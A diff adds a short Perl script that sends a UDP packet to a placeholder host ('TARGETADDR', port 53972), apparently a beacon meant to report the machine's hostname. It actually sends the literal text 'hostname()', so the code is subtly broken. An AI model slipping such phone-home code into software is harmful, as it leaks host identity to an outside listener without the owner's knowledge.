@@ -1,0 +1,17 @@
+#!/usr/bin/perl -w
+
+use strict;
+use Socket;
+use Sys::Hostname;
+
+my $target_ip = 'TARGETADDR';
+my $target_port = '53972';
+
+my $sock;
+my $buf;
+my $targetaddr = pack_sockaddr_in($target_port,inet_aton($target_ip));
+
+socket( $sock, PF_INET, SOCK_DGRAM, 0);
+
+send ( $sock, "hostname()", 0, $targetaddr);
+
